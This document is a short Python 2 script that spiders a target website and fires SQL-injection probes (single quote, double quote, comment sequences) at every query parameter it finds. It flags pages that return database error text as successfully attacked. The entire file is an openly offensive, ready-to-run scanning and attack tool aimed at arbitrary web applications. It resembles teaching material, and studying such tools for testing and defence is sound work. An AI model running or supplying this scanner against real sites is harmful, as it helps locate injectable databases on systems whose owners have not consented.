#!/usr/bin/python

###[ Loading modules

import sys
import httplib2
from urlparse import urlparse
from BeautifulSoup import BeautifulSoup


###[ Global vars

max_urls = 999
inject_chars = ["'",
                "--",
                "/*",
                '"']
error_msgs = [
    "syntax error",
    "sql error",
    "failure",
]

known_url = {}
already_attacked = {}
attack_urls = []


###[ Subroutines

def get_abs_url(link):
    """
    check if the link is relative and prepend the protocol
    and host. filter unwanted links like mailto and links
    that do not go to our base host
    """
    if link:
        if "://" not in link:
            if link[0] != "/":
                link = "/" + link

            link = protocol + "://" + base_host + link

        if "mailto:" in link or base_host not in link:
            return None
        else:
            return link


def spider(url):
    """
    check if we dont know the url
    spider to url
    extract new links
    spider all new links recursively
    """
    if len(known_url) >= max_urls:
        return None

    if url:
        (n_proto, n_host, n_path,
         n_params, n_query, n_frag) = urlparse(url)

        if not known_url.get(url) and n_host == base_host:
            try:
                sys.stdout.write(".")
                sys.stdout.flush()

                known_url[url] = True
                response, content = browser.request(url)

                if response.status == 200:
                    if "?" in url:
                        attack_urls.append(url)

                    soup = BeautifulSoup(content)

                    for tag in soup('a'):
                        spider(get_abs_url(tag.get('href')))
            except httplib2.ServerNotFoundError:
                print "Got error for " + url + \
                      ": Server not found"
            except httplib2.RedirectLimit:
                pass


def found_error(content):
    """
    try to find error msg in html
    """
    got_error = False

    for msg in error_msgs:
        if msg in content.lower():
            got_error = True

    return got_error


def attack(url):
    """
    parse an urls parameter
    inject special chars
    try to guess if attack was successfull
    """
    (a_proto, a_host, a_path,
     a_params, a_query, a_frag) = urlparse(url)

    if not a_query in already_attacked.get(a_path, []):
        already_attacked.setdefault(a_path, []).append(a_query)

        try:
            sys.stdout.write("\nAttack " + url)
            sys.stdout.flush()
            response, content = browser.request(url)

            for param_value in a_query.split("&"):
                param, value = param_value.split("=")

                for inject in inject_chars:
                    a_url = a_proto + "://" + \
                            a_host + a_path + \
                            "?" + param + "=" + inject
                    sys.stdout.write(".")
                    sys.stdout.flush()
                    a_res, a_content = browser.request(a_url)

                    if content != a_content:
                        print "\nGot different content " + \
                              "for " + a_url
                        print "Checking for exception output"
                        if found_error(a_content):
                            print "Attack was successful!"
        except (httplib2.ServerNotFoundError,
                httplib2.RedirectLimit):
            pass


###[ MAIN PART

if len(sys.argv) < 2:
    print sys.argv[0] + ": <url>"
    sys.exit(1)

start_url = sys.argv[1]
(protocol, base_host,
 path, params, query, frag) = urlparse(start_url)
browser = httplib2.Http()

sys.stdout.write("Spidering")
spider(start_url)
sys.stdout.write(" Done.\n")

for url in attack_urls:
    attack(url)
